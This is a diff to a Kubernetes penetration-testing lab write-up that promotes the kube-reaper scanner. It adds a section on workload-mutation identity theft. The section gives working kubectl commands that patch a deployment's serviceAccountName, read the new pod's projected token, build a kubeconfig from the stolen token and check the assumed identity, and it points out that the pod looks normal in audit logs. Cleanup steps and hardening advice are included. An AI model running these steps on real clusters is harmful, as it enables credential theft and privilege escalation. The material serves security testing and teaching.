@@ -171,7 +171,7 @@ The `cicd` namespace is the weak link. No PSS enforcement **and** we can create 
 
 ### Dangerous Permission Patterns
 
-[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has a library of 50 dangerous RBAC permission patterns. It matches our permissions against every pattern and reports what we can do:
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has a library of 55 dangerous RBAC permission patterns. It matches our permissions against every pattern and reports what we can do:
 
 **CRITICAL:**
 - Create Pods (No PSS Enforcement) in cicd. This enables node breakout.
@@ -965,7 +965,179 @@ pod "sa-spec-test" deleted
 
 ---
 
-## Scan 6: DNS Service Discovery and Admission Controller Probing
+## Scan 6: Workload Mutation Identity Theft
+
+Scan 5 showed how to steal an identity by creating a new pod with a target service account. Workload mutation does the same thing, but without creating a pod. Instead, you patch an existing Deployment, DaemonSet, or StatefulSet and change its `serviceAccountName` field. When the workload controller rolls out new pods, those pods run as the target identity. The API server mounts a projected token for the new SA automatically.
+
+This matters in environments where admission webhooks or resource quotas block pod creation. If you cannot create pods but can patch deployments, workload mutation still works. It is the fallback path when the primary identity theft technique (Scan 5) is blocked.
+
+In this lab, the code-server SA already has `create pods` permission, so workload mutation is redundant. The SA spec pivot from Scan 5 is a simpler path. We demonstrate this technique here to show what an attacker with only `patch deployments` permission (and no `create pods`) could do. In a locked-down environment, this could be the only identity theft vector available.
+
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) detects the `patch` and `update` verbs on `deployments`, `daemonsets`, and `statefulsets` as identity theft vectors. Each workload type has a different operational impact: DaemonSet mutations run on every node. StatefulSet mutations persist across restarts because of stable storage. Deployment mutations trigger a rolling update with one kubectl command.
+
+From the code-server foothold scan:
+
+```
+● Patch Deployments (Identity Theft) (system:serviceaccount:development:code-server@cicd)
+  │ Resource: deployments [get, list, watch, create, delete, patch]
+  │ Attack: Patch Deployment spec.template.spec.serviceAccountName to
+  │         a privileged SA -> new pods mount that SA's projected token
+  │         -> harvest token from pod logs or exec.
+  └ Enables: Privilege Escalation, Lateral Movement, Credential Harvest
+
+● Patch Deployments (Identity Theft) (system:serviceaccount:development:code-server@development)
+  │ Resource: deployments [get, list, watch, create, delete, patch]
+  │ Attack: Patch Deployment spec.template.spec.serviceAccountName to
+  │         a privileged SA -> new pods mount that SA's projected token
+  │         -> harvest token from pod logs or exec.
+  └ Enables: Privilege Escalation, Lateral Movement, Credential Harvest
+```
+
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged this in both `cicd` and `development` namespaces. The code-server SA can patch deployments in both.
+
+### Manual Validation: Workload Mutation
+
+**Step 1: Confirm the permission.**
+
+```bash
+[k8s-control-plane-1] $ kubectl auth can-i patch deployments --as system:serviceaccount:development:code-server -n development
+```
+
+```
+yes
+```
+
+```bash
+[k8s-control-plane-1] $ kubectl auth can-i patch deployments --as system:serviceaccount:development:code-server -n cicd
+```
+
+```
+yes
+```
+
+Code-server can patch deployments in both namespaces. It cannot patch DaemonSets or StatefulSets:
+
+```bash
+[k8s-control-plane-1] $ kubectl auth can-i patch daemonsets --as system:serviceaccount:development:code-server -n development
+```
+
+```
+no
+```
+
+**Step 2: Find a target deployment and a target SA.**
+
+```bash
+[k8s-control-plane-1] $ kubectl get deployments -n development -o wide --as system:serviceaccount:development:code-server
+```
+
+```
+NAME          READY   UP-TO-DATE   AVAILABLE   AGE    CONTAINERS    IMAGES                                      SELECTOR
+code-server   1/1     1            1           3d5h   code-server   docker.io/codercom/code-server:4.107.0-39   app=code-server
+```
+
+The code-server deployment exists in the development namespace. It runs as the `code-server` service account. Now check what other service accounts exist:
+
+```bash
+[k8s-control-plane-1] $ kubectl get sa -n development
+```
+
+```
+NAME          AGE
+code-server   3d5h
+default       3d5h
+developer     3d5h
+```
+
+Three SAs exist: `code-server` (current), `default`, and `developer`. The attacker would target whichever SA has the most useful permissions. In this lab the `developer` SA has limited permissions (pods list/get, pods/portforward create). In a production cluster, this could be a CI/CD pipeline SA with secret read access or a monitoring SA with cluster-wide permissions.
+
+**Step 3: Patch the deployment.**
+
+We change the code-server deployment's `serviceAccountName` from `code-server` to `developer`:
+
+```bash
+[k8s-control-plane-1] $ kubectl patch deployment code-server -n development --as system:serviceaccount:development:code-server -p '{"spec":{"template":{"spec":{"serviceAccountName":"developer"}}}}'
+```
+
+```
+deployment.apps/code-server patched
+```
+
+The patch triggers a rolling update. Kubernetes terminates the old pods and creates new ones with the `developer` SA:
+
+```bash
+[k8s-control-plane-1] $ kubectl rollout status deployment code-server -n development --timeout=60s
+```
+
+```
+deployment "code-server" successfully rolled out
+```
+
+**Step 4: Verify the new pod runs as the target SA.**
+
+```bash
+[k8s-control-plane-1] $ kubectl get pods -n development -l app=code-server -o wide
+```
+
+```
+NAME                           READY   STATUS    RESTARTS   AGE   IP              NODE           
+code-server-5f5dd64b99-2thsz   1/1     Running   0          31s   10.244.140.36   k8s-worker-2
+```
+
+A new pod is running. The old pod was replaced during the rolling update.
+
+**Step 5: Harvest the projected token and verify the stolen identity.**
+
+Read the token from inside the new pod:
+
+```bash
+[k8s-control-plane-1] $ TOKEN=$(kubectl exec code-server-5f5dd64b99-2thsz -n development -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+```
+
+Build a clean kubeconfig with the stolen token (a clean kubeconfig is necessary because client certificates in the default kubeconfig override the `--token` flag):
+
+```bash
+[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/mutation-test.yaml
+[k8s-control-plane-1] $ kubectl config set-credentials stolen --token=$TOKEN --kubeconfig=/tmp/mutation-test.yaml
+[k8s-control-plane-1] $ kubectl config set-context stolen --cluster=lab --user=stolen --kubeconfig=/tmp/mutation-test.yaml
+[k8s-control-plane-1] $ kubectl config use-context stolen --kubeconfig=/tmp/mutation-test.yaml
+```
+
+Verify the identity:
+
+```bash
+[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/mutation-test.yaml auth whoami
+```
+
+```
+ATTRIBUTE   VALUE
+Username    system:serviceaccount:development:developer
+UID         28333d99-9b8e-4dff-b14f-f3b94dda9378
+Groups      [system:serviceaccounts system:serviceaccounts:development
+             system:authenticated]
+```
+
+We are now `system:serviceaccount:development:developer`. No pod was created. No secret was read. We patched one field on an existing deployment, and the Kubernetes controller did the rest. The rolling update replaced pods automatically, and the API server mounted a projected token for the target SA.
+
+This technique has an operational advantage over the SA spec pivot in Scan 5: it does not leave an orphaned pod behind. The deployment controller manages the lifecycle. The pod looks normal in audit logs because it was created by the ReplicaSet controller, not directly by the attacker.
+
+### Cleanup
+
+```bash
+[k8s-control-plane-1] $ kubectl patch deployment code-server -n development -p '{"spec":{"template":{"spec":{"serviceAccountName":"code-server"}}}}'
+```
+
+```
+deployment.apps/code-server patched
+```
+
+```bash
+[k8s-control-plane-1] $ rm -f /tmp/mutation-test.yaml
+```
+
+---
+
+## Scan 7: DNS Service Discovery and Admission Controller Probing
 
 [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has two reconnaissance features that work without RBAC permissions for service listing or require only pod creation.
 
@@ -1111,6 +1283,7 @@ Step 1: code-server SA (development namespace)
   │
   │ code-server has create pods permission in cicd
   │ cicd namespace has no PSS enforcement
+  │ code-server has patch deployments in development and cicd
   │
   ├─── Path A: Privileged Pod Breakout ───────────────
   │
@@ -1159,7 +1332,31 @@ Step 4b: Authenticate as stolen identity
   │ Now operating as the target SA
   │ Repeat for each interesting SA in the namespace
   │
-  ├─── Both paths converge ───────────────────────────
+  ├─── Path C: Workload Mutation Identity Theft ───────
+  │
+  ▼
+Step 2c: Patch existing deployment's serviceAccountName
+  │
+  │ kubectl patch deployment code-server -n development
+  │   -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target>"}}}}'
+  │ No new pod created. Rolling update replaces pods automatically.
+  │ New pods run as the target SA.
+  │
+  ▼
+Step 3c: Harvest the projected token
+  │
+  │ kubectl exec into the rolled-out pod
+  │ Read /var/run/secrets/kubernetes.io/serviceaccount/token
+  │ Build kubeconfig with the stolen token
+  │
+  ▼
+Step 4c: Authenticate as stolen identity
+  │
+  │ Now operating as the target SA
+  │ Pod looks normal in audit logs (created by ReplicaSet controller)
+  │ No orphaned attacker pod to clean up
+  │
+  ├─── All paths converge ─────────────────────────────
   │
   ▼
 Step 5: Lateral movement
@@ -1180,9 +1377,9 @@ Step 6: Control plane access
 Step 7: Cluster admin
 ```
 
-Path A is the privileged pod breakout. It gives you node-level access and every credential on that node. Path B is the SA spec identity pivot. It gives you a specific SA identity without touching the node at all. Both paths start from the same permission: `create pods` in a namespace with no PSS.
+Path A is the privileged pod breakout. It gives you node-level access and every credential on that node. Path B is the SA spec identity pivot. It gives you a specific SA identity without touching the node at all. Both start from the same permission: `create pods` in a namespace with no PSS. Path C is workload mutation. It steals an identity by patching an existing deployment instead of creating a new pod. This works even when admission webhooks or resource quotas block pod creation.
 
-[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified Path A (steps 1 through 3a) and Path B (steps 2b through 4b) automatically from the foothold scan. The admin scan with `--pivot` mapped the identity relationships that make step 5 onward possible. No manual RBAC review could piece this together as fast.
+[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified Path A (steps 1 through 3a), Path B (steps 2b through 4b), and Path C (steps 2c through 4c) automatically. The admin scan with `--pivot` mapped the identity relationships that make step 5 onward possible. No manual RBAC review could piece this together as fast.
 
 ---
 
@@ -1191,7 +1388,7 @@ Path A is the privileged pod breakout. It gives you node-level access and every 
 | Capability | What it does | Why it matters |
 |-----------|-------------|----------------|
 | **Permission enumeration** | Maps your exact RBAC rules across every namespace | Shows what you can touch, not just what roles you have |
-| **Dangerous pattern matching** | 50 patterns matched against your permissions | Catches things beyond "can create pods" |
+| **Dangerous pattern matching** | 55 patterns matched against your permissions | Catches things beyond "can create pods" |
 | **Attack chain analysis** | Chains permissions into multi-step escalation paths | Turns permission data into actionable attack plans |
 | **Namespace PSS mapping** | Correlates pod creation with PSS enforcement | Identifies which namespaces allow privileged pods |
 | **Pod security analysis** | Flags privileged pods, hostPath, hostPID, hostNetwork | Finds existing breakout-ready pods |
@@ -1200,6 +1397,7 @@ Path A is the privileged pod breakout. It gives you node-level access and every 
 | **Secret triage** | Classifies accessible secrets by attack value | Highlights SA tokens, certs, and credentials |
 | **CRD attack surface** | Identifies dangerous CRDs (Calico, Istio, etc.) | Catches service mesh and CNI misconfiguration |
 | **SA spec identity pivot** | Detects pod creation + target SA in same namespace | Steals identities without reading secrets or minting tokens |
+| **Workload mutation detection** | Detects patch/update on deployments, daemonsets, statefulsets | Catches identity theft via existing workloads when pod creation is blocked |
 | **Unconventional pattern detection** | Flags escalate/bind verbs, direct ReplicaSet creation, webhook manipulation | Catches what other tools miss |
 | **DNS service discovery** | Queries CoreDNS for 48 common service names across all namespaces | Finds services without RBAC permissions to list them |
 | **Admission controller probing** | Dry-run pod creates test what each namespace allows | Maps enforcement gaps before you commit to an attack |
@@ -1220,6 +1418,7 @@ What would have stopped this attack chain:
 6. **Monitor ReplicaSet creation.** Audit policies should catch direct ReplicaSet creation, not just Deployments.
 7. **Use PSS `restricted` instead of `baseline` where possible.** The `baseline` policy allows `runAsRoot` (UID 0). An attacker can still run containers as root even with `baseline` enforced. The `restricted` policy blocks this.
 8. **Apply admission enforcement to all namespaces.** The cicd namespace had zero enforcement. Any identity with pod creation in that namespace can deploy privileged containers with no admission check.
+9. **Restrict patch/update on workloads.** An identity that can patch a Deployment, DaemonSet, or StatefulSet can change its `serviceAccountName` and steal any SA token in the namespace. Treat workload patch permissions as identity theft vectors, not just deployment management.
 
 Run [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) against your own cluster. The output tells you exactly where the gaps are and how an attacker would use them.
 
